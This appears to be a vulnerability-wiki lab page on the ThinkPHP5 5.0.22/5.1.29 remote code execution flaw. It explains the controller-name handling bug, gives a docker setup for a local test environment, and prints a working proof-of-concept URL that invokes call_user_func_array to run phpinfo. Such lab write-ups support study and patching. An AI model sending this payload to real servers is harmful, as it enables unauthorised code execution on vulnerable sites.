<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Thinkphp/5-rce/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Thinkphp5 5.0.22/5.1.29 Remote Code Execution Vulnerability - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Thinkphp5 5.0.22/5.1.29 Remote Code Execution Vulnerability", url: "#_top", children: [
              {title: "Environment Setup", url: "#environment-setup" },
              {title: "POC", url: "#poc" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../2-rce/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../2-rce/README.zh-cn/" class="btn btn-xs btn-link">
        ThinkPHP 2.x 任意代码执行漏洞
      </a>
    </div>
    
  </div>

    

    <h1 id="thinkphp5-50225129-remote-code-execution-vulnerability">Thinkphp5 5.0.22/5.1.29 Remote Code Execution Vulnerability<a class="headerlink" href="#thinkphp5-50225129-remote-code-execution-vulnerability" title="Permanent link">&para;</a></h1>
<p><a href="README.zh-cn/">中文版本(Chinese version)</a></p>
<p>ThinkPHP is an extremely widely used PHP development framework in China. In its version 5, as the framework processes controller name incorrectly, it can execute any method if the website doesn't have mandatory routing enabled (which is default), resulting in a RCE vulnerability.</p>
<p>Reference links：</p>
<ul>
<li><a href="http://www.thinkphp.cn/topic/60400.html">http://www.thinkphp.cn/topic/60400.html</a></li>
<li><a href="http://www.thinkphp.cn/topic/60390.html">http://www.thinkphp.cn/topic/60390.html</a></li>
<li><a href="https://xz.aliyun.com/t/3570">https://xz.aliyun.com/t/3570</a></li>
</ul>
<h2 id="environment-setup">Environment Setup<a class="headerlink" href="#environment-setup" title="Permanent link">&para;</a></h2>
<p>Enter the following command：(ThinkPHP version:5.0.20)</p>
<div class="highlight"><pre><span></span><code>docker compose up -d
</code></pre></div>
<p>Visit <code>http://your-ip:8080</code> and you'll see the default page of ThinkPHP.</p>
<h2 id="poc">POC<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
<p>Directly visit <code>http://your-ip:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</code> and it'll execute the phpinfo：</p>
<p><img alt="" src="1.png" /></p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../2-rce/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../2-rce/README.zh-cn/" class="btn btn-xs btn-link">
        ThinkPHP 2.x 任意代码执行漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>